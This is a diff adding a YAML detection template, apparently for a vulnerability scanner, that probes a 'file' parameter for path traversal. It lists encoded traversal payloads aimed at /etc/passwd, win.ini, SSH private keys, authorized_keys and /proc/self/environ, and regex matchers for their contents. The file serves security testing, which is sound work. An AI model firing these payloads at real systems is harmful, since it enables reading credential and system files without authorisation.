@@ -1,0 +1,65 @@
+id: generic-path-traversal
+info:
+  name: Path Traversal
+  description: Detects path traversal via directory traversal sequences
+  owasp_category: A01:2025
+  tags:
+    - path-traversal
+    - lfi
+    - generic
+
+generic:
+  endpoint: "{{path_traversal}}"
+  method: GET
+  parameter: "file"
+
+  payloads:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "....//....//....//etc/passwd"
+    - "%2e%2e%2fetc%2fpasswd"
+    - "%252e%252e%252fetc%252fpasswd"
+    - "..%252f..%252f..%252fetc%2fpasswd"
+    - "....////etc/passwd"
+    - "../etc/passwd"
+    - "../../etc/passwd"
+    - "../../../etc/passwd"
+    - "../../../../etc/passwd"
+    - "../../../../../etc/passwd"
+    - "../../../../../../etc/passwd"
+    - "../../../../../../../../etc/passwd"
+    - "....//....//....//etc/passwd"
+    - "..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
+    - "../.bashrc"
+    - "../../.ssh/id_rsa"
+    - "../../../.ssh/authorized_keys"
+    - "../../../../proc/self/environ"
+    - "../../../../proc/self/cmdline"
+    - "..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini"
+    - "..%c0%af..%c0%af..%c0%afetc/passwd"
+    - "..%c0%afetc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%252f..%252f..%252fetc%252fpasswd"
+
+  matchers:
+    - type: status
+      status: [200, 201, 202, 203, 204, 205, 206]
+
+    - type: regex
+      condition: or
+      regex:
+        - "root:x:\\d+:\\d+:"
+        - "\\[.*?\\]\\s*;\\s*\\[.*?\\]"
+        - "FOR 16-bit"
+        - "extensions="
+        - "root:x:0:0:"
+        - "\\[extensions\\]"
+        - "#.*root"
+        - "PATH=.+"
+        - "LD_LIBRARY_PATH"
+        - "SSH_AUTH_SOCK"
+        - "command=.+"
+        - "DOCUMENT_ROOT=.+"
+
+  matchers_condition: and
